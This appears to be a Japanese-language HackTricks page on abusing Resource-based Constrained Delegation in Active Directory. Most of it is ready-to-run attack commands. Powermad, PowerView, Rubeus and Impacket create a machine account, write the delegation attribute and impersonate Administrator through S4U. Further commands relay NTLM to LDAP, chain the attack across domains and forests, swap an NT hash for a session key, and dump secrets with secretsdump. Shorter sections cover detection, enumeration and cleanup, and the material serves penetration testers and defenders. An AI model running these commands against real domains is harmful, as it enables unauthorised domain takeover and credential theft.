# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegationの基本

Resource-based constrained delegation（RBCD）は[constrained delegation](constrained-delegation.md)に類似していますが、信頼の方向が逆です。従来のconstrained delegationでは、あるプリンシパルがどのサービスへ委任できるかを記録します。一方、RBCDでは**対象リソース**上に、そのリソースに対してユーザーを偽装できるプリンシパルを記録します。<sup>[[12]](#references)</sup>

対象オブジェクトの _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 属性には、そのリソースに対して他のIDの代理として動作することを許可されたプリンシパルを識別するセキュリティ記述子が含まれます。

もう1つの重要な違いは、**コンピューターアカウントに対する十分な書き込み権限**（`GenericAll`、`GenericWrite`、`WriteDacl`、`WriteProperty`など）を持つプリンシパルが、_**msDS-AllowedToActOnBehalfOfOtherIdentity**_ を設定できる可能性がある点です。従来のconstrained delegationの設定には、通常、より高い権限を持つ管理アクセスが必要です。<sup>[[1]](#references)</sup>

より正確には、従来のconstrained delegation設定の変更は通常、ドメインコントローラー上の `SeEnableDelegationPrivilege` によって制限されています。この権限は一般に、非常に高い権限を持つ管理者が保持しています。RBCDでは判断を対象オブジェクトのセキュリティ記述子に移すため、該当するコンピューターオブジェクトのプロパティへの書き込みアクセスがあれば、そのユーザー権限がなくても十分な場合があります。<sup>[[1]](#references)[[2]](#references)</sup>

### New Concepts

`userAccountControl` の **`TrustedToAuthForDelegation`** フラグは、**S4U2Self** の前提条件として説明されることが多いですが、これは完全には正確ではありません。\
SPNを持つサービスプリンシパルは、このフラグがなくてもS4U2Selfを要求できます。`TrustedToAuthForDelegation` がある場合、返されるservice ticketは**forwardable**になります。これがない場合、ticketは通常**non-forwardable**です。<sup>[[5]](#references)</sup>

従来のconstrained delegationでは、S4U2Proxyの段階で**non-forwardable TGS**を拒否します。RBCDでは、対象のセキュリティ記述子が要求元のサービスを認可していれば、そのS4U2Self ticketを受け入れられます。<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Attack structure

> **コンピューターアカウント**に対する**書き込みと同等の権限**を持っている場合、そのマシンへの特権アクセスを取得できる可能性があります。

攻撃者がすでに**被害者のコンピューターオブジェクトに対する書き込みと同等の権限**を持っていると仮定します。

1. 攻撃者は**SPN**を持つアカウント（「Service A」）を**侵害**するか、**作成**します。デフォルトでは、認証済みドメインユーザーは、**_MachineAccountQuota_** によって制御される範囲で、最大10個のコンピューターオブジェクトを作成できます。コンピューターオブジェクトには、利用可能なSPNが自動的に提供されます。
2. 攻撃者は、被害者のコンピューター（ServiceB）に対する**WRITE権限を悪用**し、ServiceAがその被害者コンピューター（ServiceB）に対して任意のユーザーを偽装できるように、**resource-based constrained delegationを設定**します。
3. 攻撃者はRubeusを使用して、Service AからService Bに対し、**Service Bへの特権アクセスを持つ**ユーザーとして、**完全なS4U攻撃**（S4U2SelfおよびS4U2Proxy）を実行します。
1. S4U2Self（侵害または作成したSPNアカウントから）：**AdministratorをService Aとして表すTGS**（non-forwardable）を要求します。
2. S4U2Proxy：その**non-forwardable TGS**を使用して、**被害者ホスト**に対する**Administrator**を表すservice ticketを要求します。
3. Service Aが対象リソースのセキュリティ記述子で認可されているため、non-forwardable ticketでもこのRBCDフローで使用できます。
4. 攻撃者は**pass-the-ticket**を行い、ユーザーを**impersonate**して被害者のServiceBへの**アクセス**を取得できます。<sup>[[1]](#references)</sup>

ドメインの _**MachineAccountQuota**_ を確認するには、次を使用できます。
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻撃

### Computer Object の作成

**[powermad](https://github.com/Kevin-Robertson/Powermad)** を使用して、domain 内に Computer Object を作成できます。<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation の設定

**Active Directory PowerShell module の使用**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**PowerViewの使用**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 完全な S4U attack の実行 (Windows/Rubeus)

まず、パスワード `123456` を使用して新しい Computer object を作成したため、そのパスワードの hash が必要です:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
これにより、そのアカウントの RC4 および AES hash が出力されます。\
これで、attack を実行できます。<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
`Rubeus` の `/altservice` パラメータを使えば、一度実行するだけで、より多くのサービス用のチケットを生成できます。
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> ユーザーには **「アカウントは機密扱いで、委任できない」** のマークを付けることができます。このフラグが有効になっている場合、そのアカウントはこの委任フローを通じて impersonate できません。BloodHound は分析中にこのプロパティを表示します。

### Linux tooling: end-to-end RBCD with Impacket (2024+)

Linux から操作する場合、公式の Impacket ツールを使用して RBCD chain 全体を実行できます:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- LDAP signing/LDAPS が強制されている場合は、`impacket-rbcd -use-ldaps ...` を使用します。
- AES keys を優先してください。多くの modern domain では RC4 が制限されています。Impacket と Rubeus はどちらも AES-only flows をサポートしています。
- Impacket は一部のツールで `sname`（"AnySPN"）を書き換えられますが、可能な限り正しい SPN を取得してください（例: CIFS/LDAP/HTTP/HOST/MSSQLSvc）。

## Cross-domain & cross-forest RBCD

**delegating principal** を制御しており、それが **resource computer** とは**異なる domain**（または**異なる forest**）に存在する場合でも、abuse は RBCD です。ただし、ticket flow は通常の単一 domain における `S4U2Self -> S4U2Proxy` ではなくなります。

### Cross-domain RBCD: configure the foreign principal by SID

**異なる domain** から `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定する場合、foreign machine/user は target domain LDAP で**名前により解決できない**ことがあります。その場合は、foreign principal の sAMAccountName/UPN ではなく、その **SID** を使用して delegation entry を設定します。

これは、`ntlmrelayx.py` を使用して NTLM を LDAP に relay する場合に特に重要です。<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
注:
- `--sid` は、`--escalate-user` を SID として扱うよう `ntlmrelayx.py` に指示します。委任アカウントが対象ドメインに属していない場合に必要です。
- ツールが `User not found in LDAP` と出力しても、security descriptor が foreign SID を直接保存するため、委任の書き込みは成功する場合があります。

### Cross-domain RBCD: cross-realm S4U sequence

foreign principal が `msDS-AllowedToActOnBehalfOfOtherIdentity` に登録されると、動作する cross-domain フローは次のとおりです:<sup>[[9]](#references)[[13]](#references)</sup>

1. 委任元 principal の所属ドメインから、その principal の **TGT** を取得する。
2. `krbtgt/<target-domain>` の **referral TGT** を要求する。
3. 対象ドメインの DC に対して、偽装するユーザーの **cross-realm S4U2Self referral** を要求する。
4. 委任元ドメインで、そのユーザーの実際の **S4U2Self** ticket を要求する。
5. 委任元ドメインで **S4U2Proxy** を実行し、対象ドメイン向けの referral ticket を取得する。
6. 対象ドメインの DC で最終的な **S4U2Proxy** を実行し、`cifs/host.target`、`host/host.target` などの service ticket を取得する。

これが、標準の Linux tooling が cross-domain RBCD で失敗することが多い理由です:<sup>[[9]](#references)</sup>
- 要求の **realm** は、`TGS-REQ` で使用する TGT の realm と異なる場合がある
- この chain には、`S4U2Self` だけ、または `S4U2Self` の直後に単一の `S4U2Proxy` を実行するだけではなく、**独立した S4U2Proxy の手順** が必要となる

### Cross-domain RBCD from Linux

Synacktiv は、2 つの KDC を明示的に処理することで、Linux から cross-realm sequence を再現する Impacket `getST.py` の実装を公開しました:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
運用上、新しい引数は次のとおりです。
- `-dc-ip`: **delegating** domain の DC
- `-targetdomain`: **resource computer** の domain
- `-targetdc`: **resource** domain の DC

### Cross-forest RBCD の制限

Cross-forest RBCD には重要な制限があります。**impersonated user は delegating principal と同じ forest に所属している必要があります**。つまり、制御している machine account が `valhalla.local` にあり、target resource が `asgard.local` にある場合、通常、RBCD を介して任意の `asgard.local` user をその resource に対して impersonate することは**できません**。<sup>[[9]](#references)</sup>

次の場合は引き続き exploit 可能です。
- **delegating forest** の user が、他方の forest にある resource host の **local admin**（またはその他の privileged user）である
- trust により必要な authentication path が許可され、foreign SID が target computer の security descriptor で受け入れられる

### Cross-forest RBCD の protocol quirks

Cross-forest RBCD は、単なる「trust を追加した cross-domain」ではありません。一般的な tooling では、これまで見落とされていた次の 2 つの quirks を含む flow が確認されています。<sup>[[9]](#references)</sup>

1. **`PA-PAC-OPTIONS=branch-aware`** を設定する追加の **S4U2Proxy** request
2. 他の etypes が request されている場合でも、最終的な service ticket が **RC4** を使用して返されることがある

実際の flow は次のとおりです。

1. forest A の delegating principal 用に TGT を取得する。
2. forest A の impersonated user 用に **S4U2Self** を request する。
3. forest A で **S4U2Proxy** を request し、forest B 用の referral TGT を取得する。
4. forest A で、S4U2Self ticket を additional ticket として指定せず、`branch-aware` を有効にした状態で 2 回目の **S4U2Proxy** を送信し、forest B 用の別の referral TGT を取得する。
5. 必要に応じて、forest B の delegating principal 用に通常の service ticket を request する（この ticket は最終的な abuse には必要ない）。
6. 手順 3 と 4 の referral ticket を使用して、forest B で、impersonated forest-A user から target SPN への最終 **S4U2Proxy** ticket を request する。

### Linux からの Cross-forest RBCD

同じ Synacktiv Impacket branch では、この logic のために `-forest` switch が追加されています。<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

**multi-domain forest** では、**S4U2Self** と **S4U2Proxy** の両方が、1回の referral の後に停止せず、**recursive** に実行される場合があります。

- **Recursive S4U2Self**: 最初の `S4U2Self` は **impersonated user の domain** に送信され、中間の parent/child hop は `krbtgt/<REALM>` に対する通常の `TGS-REQ` referral で通過し、**final S4U2Self** は **delegating principal 自身の domain** に送信されます。
- これは、**machine account の TGT を保持しているだけ**で、同じ forest 内にある別の domain の **admin** を impersonate し、`cifs/host`、`host/host`、`wsman/host` などを request できる可能性があることを意味します。
- **Recursive S4U2Proxy** も同様に trust chain をたどります。中間 hop では、前の ticket を TGT として再利用しながら、次の `krbtgt/<REALM>` referral を request し、最後の hop だけが final service ticket を返します。<sup>[[10]](#references)</sup>

実用的な same-forest の例は次のとおりです。
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less クロスドメイン / クロスフォレスト RBCD

**delegating principal が SPN を持たないユーザーの場合**、最後の再帰的な `S4U2Self` は **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** で失敗します。回避策は、最後の hop のみを **`S4U2Self+U2U`** として再試行することです。<sup>[[10]](#references)</sup>

悪用チェーンの短縮版:

1. **NT hash** で認証し、KDC が **RC4-HMAC (etype 23)** を使用するよう誘導します。
2. 最初に **`-self -u2u`** をリクエストし、その ticket を後続の proxy step 用とは分けて保持します。
3. `describeTicket.py` で **TGT session key** を抽出します。
4. `changepasswd.py -newhashes <session_key>` を使用し、ユーザーの **NT hash** をその **session key** に置き換えます。
5. 別の **`-proxy`** リクエスト中に、`S4U2Self+U2U` ticket を **`-additional-ticket`** として再利用します。
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operational caveats:

- **first trusted hop is already another forest** の場合は、native Windows の動作に合わせるため、**branch-aware** algorithm（`getST.py ... -forest`）を優先してください。foreign forest に chain の**後段**で到達するだけなら、non-branch-aware の recursive flow でも動作する場合があります。<sup>[[9]](#references)</sup>
- 最近の **Windows Server 2022/2025** DC では、RC4 deprecation により、forced RC4 が **`KDC_ERR_ETYPE_NOSUPP`** で失敗することがあります。このため、classic SPN-backed RBCD は AES で動作していても、**SPN-less RBCD** が不可能になる場合があります。<sup>[[15]](#references)</sup>
- ユーザーの hash/password を変更する前に **`S4U2Self+U2U`** を実行してください。`SamrChangePasswordUser` はアカウントの Kerberos AES keys を再計算しないため、先に password を変更すると、その後の ticket requests が失敗する可能性があります。<sup>[[14]](#references)</sup>
- impersonated account は引き続き **delegable** でなければなりません。**Protected Users** および **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** が設定されたアカウントは chain をブロックします。

## Detection / hardening notes

- domains/forests をまたぐ RBCD paths は、現在でも通常、**ACL abuse** または **relay-to-LDAP** によって作成されます。一般的な setup paths を阻止するため、DC で **LDAP signing** と **LDAP channel binding** を強制してください。
- computer objects 上の `msDS-AllowedToActOnBehalfOfOtherIdentity` に書き込み可能なユーザーを監査し、保存されている SIDs（**foreign security principals** を含む）を解決してください。
- trust-heavy environments では、**Selective Authentication**、**SID filtering**、および foreign forest のユーザーが resource hosts 上で **local admin** 権限を持っているかを確認してください。

### Accessing

最後の command line は、**complete S4U attack を実行し、Administrator から victim host への TGS を memory に inject** します。\
この例では Administrator から **CIFS** service 用の TGS を request しているため、**C$** にアクセスできます。
```bash
ls \\victim.domain.local\C$
```
### 異なる service tickets の悪用

[**利用可能な service tickets はこちら**](silver-ticket.md#available-services)で確認できます。

## 列挙、監査、クリーンアップ

### RBCD が設定されたコンピューターを列挙する

PowerShell（SID を解決するために SD をデコード）：
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket（1つのコマンドで読み取りまたはフラッシュ）:
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### RBCD の Cleanup / reset

- PowerShell（attribute をクリア）：
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: これは、kerberos が DES または RC4 を使用しないように構成されており、RC4 hash のみを指定していることを意味します。Rubeus に少なくとも AES256 hash を指定してください（または rc4、aes128、aes256 hash をすべて指定してください）。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** が通常の user に対する `-self` 中に発生する場合: delegation を行う principal に **SPN がない**可能性があります。通常の **`S4U2Self`** の代わりに **`S4U2Self+U2U`** として **last hop** を再試行してください。<sup>[[10]](#references)</sup>
- **SPN-less RBCD** 中の **`KDC_ERR_ETYPE_NOSUPP`**: 最近の DC は、`S4U2Self+U2U` + session-key-substitution trick に必要な強制 **RC4-HMAC** path を拒否する場合があります。代わりに AES を使用する classic な **SPN-backed** RBCD path を試してください。<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: これは、現在の computer の時刻が DC の時刻と異なり、kerberos が正常に動作していないことを意味します。
- **`preauth_failed`**: これは、指定した username + hashes では login できないことを意味します。hashes の生成時に username 内へ "$" を入れ忘れている可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**: 以下を意味する可能性があります:
- impersonate しようとしている user が、目的の service にアクセスできない（impersonate できない、または十分な privileges がないため）
- 要求した service が存在しない（winrm の ticket を要求したが、winrm が実行されていない場合）
- 作成した fakecomputer が vulnerable server に対する privileges を失っており、再付与する必要がある。
- classic KCD を abuse している。RBCD は non-forwardable S4U2Self tickets で動作しますが、KCD には forwardable が必要であることに注意してください。

## Notes, relays and alternatives

- LDAP が filtered の場合、AD Web Services（ADWS）経由で RBCD SD を AD に書き込むこともできます。参照:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains は、1 step で local SYSTEM を取得するために RBCD で終了することがよくあります。実践的な end-to-end の例:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding が **disabled** で、かつ machine account を作成できる場合、**KrbRelayUp** などの tools は、強制した Kerberos auth を LDAP に relay し、target computer object 上で自分の machine account に対する `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定して、off-host から S4U 経由で直ちに **Administrator** を impersonate できます。<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog: Resource-Based Constrained Delegation を abuse して Active Directory を攻撃](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Delegation についての別の一言 – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation Abuse](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: Offensive Kerberos の概要](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py（official）](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Recent syntax を使用した Quick Linux cheatsheet](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno（LDAP signing off → Kerberos relay to RBCD）](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - cross-domain & cross-forest RBCD の探索](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - cross-domain & cross-forest RBCD の探索: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation の概要](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kerberos における RC4 使用の検出と remediation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
